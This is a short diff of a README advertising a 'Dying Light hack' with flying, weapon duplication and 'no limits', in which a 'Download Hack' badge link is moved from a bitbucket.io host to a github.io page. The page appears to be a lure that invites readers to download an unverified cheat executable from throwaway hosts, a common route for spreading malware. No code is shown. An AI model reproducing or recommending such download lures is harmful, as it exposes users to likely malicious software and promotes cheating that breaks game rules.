@@ -2,7 +2,7 @@
 
 **Tired of getting clapped by Volatiles? Wanna fly across rooftops or duplicate the best weapons like a madman? A Dying Light hack gives you full freedom to dominate the game without limits.**
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload4.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://Dying-Light-Hack-bigos.github.io/.github)
 ---
 
 ## 💣 What is a Hack in Dying Light?
